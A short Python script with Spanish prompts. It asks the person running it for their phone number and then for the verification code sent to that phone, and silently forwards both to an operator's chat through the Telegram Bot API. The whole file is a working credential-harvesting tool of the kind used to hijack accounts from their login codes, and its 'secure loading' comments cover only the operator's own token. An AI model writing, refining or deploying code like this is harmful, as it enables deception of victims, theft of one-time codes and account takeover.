import requests
import telebot
from secure_loader import get_telegram_token, get_admin_id, validate_environment

# Validar y cargar tokens de forma segura
if not validate_environment():
    print("❌ Error: No se pudieron cargar los tokens requeridos.")
    print("💡 Ejecuta: python setup_tokens.py")
    exit(1)

# Cargar tokens de forma segura
TOKEN = get_telegram_token()
bot = telebot.TeleBot(TOKEN)

def enviar_telefono(chat_id, telefono):
    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
    payload = {
        'chat_id': chat_id,
        'text': f'Número de teléfono recibido: {telefono}'
    }
    response = requests.post(url, data=payload)
    return response.json()

def enviar_codigo(chat_id, codigo):
    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
    payload = {
        'chat_id': chat_id,
        'text': f'Código recibido: {codigo}'
    }
    response = requests.post(url, data=payload)
    return response.json()

def main():
    # Obtener chat_id de forma segura
    chat_id = get_admin_id()
    if not chat_id or chat_id == "TU_CHAT_ID":
        print("❌ Error: Chat ID no configurado correctamente.")
        print("💡 Ejecuta: python setup_tokens.py")
        return
    
    print("Introduce tu número de teléfono:")
    telefono = input()
    enviar_telefono(chat_id, telefono)

    print("Se ha enviado un código a tu número de teléfono. Introduce el código recibido:")
    codigo = input()
    enviar_codigo(chat_id, codigo)

if __name__ == "__main__":
    main()